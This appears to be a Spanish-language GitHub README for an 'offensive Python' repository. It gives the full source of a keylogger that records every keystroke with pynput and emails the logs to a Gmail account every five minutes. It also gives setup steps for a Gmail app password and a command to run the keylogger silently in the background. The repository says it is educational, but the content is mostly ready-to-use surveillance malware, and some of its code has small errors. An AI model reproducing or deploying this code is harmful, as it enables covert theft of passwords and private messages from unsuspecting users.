# Bienvenido a este repositorio
Este Repo, está diseñado para proporcionar una herramienta eficaz y sencilla para la captura de teclas, también conocido como keylogger, utilizando Python. Esta implementación no solo se enfoca en registrar las pulsaciones de teclado, sino también en enviar los registros a través de correo electrónico de manera segura y automatizada.

# Uso y Propósito
Este proyecto está diseñado con fines educativos y de prueba. Proporciona una manera práctica de aprender sobre la captura de teclas y el manejo de correos electrónicos en Python. Se recomienda usar esta herramienta de manera ética y respetuosa, siempre con el consentimiento adecuado si se prueba en sistemas ajenos.

# Para comenzar, asegúrate de cumplir con los siguientes requisitos:

- Cuenta de Gmail: Necesitarás una cuenta de Gmail para enviar los registros por correo electrónico.
- Contraseña de Aplicación: Debes generar una contraseña de aplicación para tu cuenta de Google. Puedes crearla accediendo a Contraseñas de Aplicaciones.
- Instalación de Pynput: Este proyecto utiliza la biblioteca pynput para capturar las teclas. Instálala ejecutando el siguiente comando:
```bash
pip3 install pynput
```

# Configuración
Una vez generada la contraseña de aplicación (por ejemplo, yxkijwbtebfukhvc), introdúcela sin espacios en el código.
- Acceder a https://myaccount.google.com/apppasswords para crear contraseña de aplicación para tu cuenta google
![Pasted image 20240628130101](https://github.com/Frib1t/Python_Ofensivo/assets/102589078/e7938d60-c808-4fd0-b098-24722f5397b8)

# Ejecución:
```bash
python3 main.py &> /dev/null & disown
```
# Descripción de Archivos
keylogger.py: Contiene la clase Keylogger que maneja la captura de teclas y el envío de correos electrónicos. Utiliza pynput para escuchar las teclas presionadas y smtplib junto con email.mime.text.MIMEText para enviar los registros.

main.py: Es el script principal que inicia el keylogger y maneja la señal de interrupción para finalizar la ejecución de manera segura.

# keylogger.py
```python
#! /usr/bin/env python3
import threading
import pynput.keyboard
import smtplib
from email.mime.text import MIMEText


class Keylogger:
	def __init__(self):
		self.log = ""
		self.request_shutdown = False
		self.timer = None
		self.is_first_run = True

	def pressed_key(self, key):
		try:
			self.log += str(key.char)	
		except AttributeError:
			special_keys = {key.space: " ", key.backspace:" Backspace ", key.enter: " Enter ", key.shift:" Shift ", key.alt:" Alt ", key.ctrl:" Ctrl ", key.alt:" Alt "}
			self.log += special_keys.get(key, f" {str(key)} ")
		# print(self.log)
	
	def send_email(self,subject, body, sender, recipients, password):
	    msg = MIMEText(body)
	    msg['Subject'] = subject
	    msg['From'] = sender
	    msg['To'] = ', '.join(recipients)
	    
	    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
	       smtp_server.login(sender, password)
	       smtp_server.sendmail(sender, recipients, msg.as_string())
	    print(colored(f"\n[+] Email sent Successfully!\n", yellow))

	def report(self):
		email_body = "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
		self.send_email("Keylogger Report", email_body, "email@gmail.com", ["email@gmail.com"], "yxkijwbtebfukhvc")
		self.log = ""

		if self.is_first_run:
			self.is_first_run = False

		if not self.request_shutdown:
			self.timer = threading.Timer(300, self.report)
			self.timer.start()

	def shutdown(self):
		self.request_shutdown = True
		if self.timer:
			self.timer.cancel()


	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key)
		
		with keyboard_listener:
			self.report()
			keyboard_listener.join()



```

# main.py
```python
#!/usr/bin/env python3
import signal
import sys
from termcolor import colored
from keylogger import Keylogger

def def_handler(sig, frame):
	print(colored(f"\n[!] Saliendo...\n", 'red'))
	my_keylogger.shutdown()
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if __name__ == '__main__':
	my_keylogger = Keylogger()
	my_keylogger.start()
```
